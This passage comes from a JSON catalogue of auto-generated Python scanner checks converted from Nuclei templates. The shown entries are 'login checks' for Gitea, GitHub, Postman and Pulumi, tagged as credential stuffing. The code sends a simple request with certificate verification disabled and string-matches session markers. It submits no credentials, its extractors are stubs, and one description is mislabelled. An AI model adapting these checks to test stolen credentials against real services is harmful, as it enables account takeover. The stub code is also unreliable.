URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Location: /' | status HTTP [303]\"\n\n        # Simple word matcher simulation\n        matchers = ['Location: /']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"gitea.com Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_gitea_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cloud",
          "creds-stuffing",
          "login-check",
          "gitea",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_github_login_check",
        "name": "Github Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid github account.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(location, 'https://github.com/sessions/two-factor'); status_code==302 | DSL: contains(to_lower(header), 'set-cookie: logged_in=yes'); contains(to_lower(header), 'set-cookie: user_session=')",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: github-login-check\nName: Github Login Check\nSeverity: critical\nDescription: Checks for a valid github account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_github_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"github-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Github Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(location, 'https://github.com/sessions/two-factor'); status_code==302 | DSL: contains(to_lower(header), 'set-cookie: logged_in=yes'); contains(to_lower(header), 'set-cookie: user_session=')\"\n\n        # Simple word matcher simulation\n        matchers = ['https://github.com/sessions/two-factor', 'set-cookie: logged_in=yes', 'set-cookie: user_session=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Github Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_github_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: github-login-check\nName: Github Login Check\nSeverity: critical\nDescription: Checks for a valid github account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_github_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"github-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Github Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(location, 'https://github.com/sessions/two-factor'); status_code==302 | DSL: contains(to_lower(header), 'set-cookie: logged_in=yes'); contains(to_lower(header), 'set-cookie: user_session=')\"\n\n        # Simple word matcher simulation\n        matchers = ['https://github.com/sessions/two-factor', 'set-cookie: logged_in=yes', 'set-cookie: user_session=']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Github Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_github_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cloud",
          "creds-stuffing",
          "login-check",
          "github",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_postman_login_check",
        "name": "Postman Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid postman account.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(to_lower(header), 'set-cookie: getpostmanlogin=yes'); contains(to_lower(body), 'identity.postman.co/continue')",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: postman-login-check\nName: Postman Login Check\nSeverity: critical\nDescription: Checks for a valid postman account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_postman_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"postman-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Postman Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(to_lower(header), 'set-cookie: getpostmanlogin=yes'); contains(to_lower(body), 'identity.postman.co/continue')\"\n\n        # Simple word matcher simulation\n        matchers = ['set-cookie: getpostmanlogin=yes', 'identity.postman.co/continue']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Postman Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_postman_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: postman-login-check\nName: Postman Login Check\nSeverity: critical\nDescription: Checks for a valid postman account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_postman_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"postman-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Postman Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(to_lower(header), 'set-cookie: getpostmanlogin=yes'); contains(to_lower(body), 'identity.postman.co/continue')\"\n\n        # Simple word matcher simulation\n        matchers = ['set-cookie: getpostmanlogin=yes', 'identity.postman.co/continue']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Postman Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_postman_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cloud",
          "creds-stuffing",
          "login-check",
          "postman",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_pulmi_login_check",
        "name": "pulmi.com Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid github account.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'pulumiAccessToken, userInfo' | status HTTP [200]",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: pulmi-login-check\nName: pulmi.com Login Check\nSeverity: critical\nDescription: Checks for a valid github account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_pulmi_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"pulmi-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"pulmi.com Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", 